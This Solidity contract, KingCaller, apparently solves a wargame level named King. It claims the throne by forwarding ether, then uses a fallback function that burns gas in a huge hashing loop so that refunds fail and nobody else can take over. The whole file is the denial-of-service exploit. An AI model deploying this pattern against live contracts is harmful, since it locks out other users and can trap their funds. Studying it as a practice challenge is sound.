// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingCaller {
  King king;

  constructor(King _king) public {
    king = _king;
  }

  function callKing() public payable {
    (bool success, ) = address(king).call.value(msg.value)("");
  }

  fallback() external payable {
    for (uint i; i < 10000000000; i++) {
      keccak256(abi.encodePacked(i));
    }
  }
}